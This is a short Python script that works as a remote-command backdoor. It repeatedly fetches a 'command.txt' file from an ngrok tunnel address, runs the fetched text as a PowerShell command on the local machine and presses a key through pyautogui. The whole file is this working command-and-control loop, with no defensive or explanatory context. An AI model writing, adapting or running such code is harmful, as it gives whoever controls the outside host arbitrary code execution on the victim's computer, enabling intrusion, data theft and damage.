import subprocess
import pyautogui
import requests as requests
import time

flag = True

ip = "http://951e-147-235-193-123.ngrok.io"

def getFile (url):
    payload = requests.get(url)
    payload = payload.content  
    res = str(payload)
    res = res[:-5]
    res = res[2:]
    return res

def run(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed



old = ""
while (flag):
    payload = getFile(ip+"/command.txt")
    print(str(payload))
    if(old != payload):
        old = payload
        print(run(old))
        time.sleep(2.5 )
        pyautogui.press(' ')


    time.sleep(2)

